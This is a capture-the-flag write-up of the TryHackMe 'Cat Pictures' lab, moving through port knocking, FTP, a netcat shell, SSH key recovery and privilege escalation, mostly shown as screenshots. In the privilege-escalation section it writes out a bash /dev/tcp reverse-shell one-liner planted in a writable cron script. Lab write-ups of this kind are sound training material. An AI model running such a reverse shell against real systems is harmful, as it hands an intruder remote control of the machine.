Link room: https://tryhackme.com/room/catpictures
# ENUMERATING
## using nmap
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/e5adc94f-493a-4fda-b978-d3509a36ff07)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/a9b26335-4fc1-4223-9113-e98b12c31fe1)
## view web
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/f6e609d6-001a-4ceb-8a94-2d4624f91cdc)

Click on the post

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/759293e2-ca20-4305-b7b6-4e53c9cda733)

=> knocking port

# EXPLOITING
## knocking
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/d47e71d1-0650-4a90-8e09-f18dab96f7b0)

After I use command ```knock```. Port 21 is in the open state

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8c626300-f22d-4c56-80fe-3a7a68950193)

## connect to ftp server

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/2ae71630-593a-45e5-b19a-34315607248e)

=> port 4420 has internal shell service. Now I try using ```nmap```  to view port 4420.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/3aa4ddfb-8a82-4b65-84be-9c2d3ec130e5)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/245bf74e-4993-45cc-afc1-03db07478c53)

## connect to port 4420 with ```nc```
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/0a98bcf9-44e2-4bd1-b538-5c988b89eaab)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/06a637ac-a10a-4335-bf73-0a66584df69b)

=> I try to use command to get regular shell. I enter it right on cmd.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/c54bec0b-25d9-47c1-a6f3-b70ea8e96be3)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/1ad0b79c-0a95-4126-a45e-2ca519ece967)

=> look at runme 
 
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/271812bf-5071-4fe4-bf70-f4213f4a37e7)

Now I run runme service with passowrd : rebecca and get private key.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/d5b41fc0-8a7d-489e-a1ad-50e8556a67d1)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/8951766a-5f8e-4071-a78c-2af4c910f014)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/48357723-f91a-4775-bbd8-31d5203d5425)
## connect to ssh server
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/ebb18669-d19f-4f47-ab6f-49a1c06080b8)

=> flag.txt
# PRIVILEGE ESCALATION
## view .bash_history
![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/0c818653-25b2-401e-bf17-7a9b4f09b375)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/9883cda9-6f18-4860-bd32-4f3e4dded603)

=> I find command ``` cat /opt/clean/clean.sh``` suspicious!!!

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/aef28462-3d6f-4cc7-8d6f-007e9b239e75)

=> I can edit file and get reverse shell. I use the command ```bash -i >&/dev/tcp/192.168.4.20/4444 <&1```
available in file clean.sh . Also I can get it at pentestmonkey website.

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/11157618-51b7-4ada-a69c-c3bccaa25e89)

![image](https://github.com/nguyenngocdung18/tryhackme/assets/134156226/e79e0ece-b8fc-4470-9062-3c4f87cd7df9)

=> root.txt

## Done!!!
Thanks for reading. Bye!
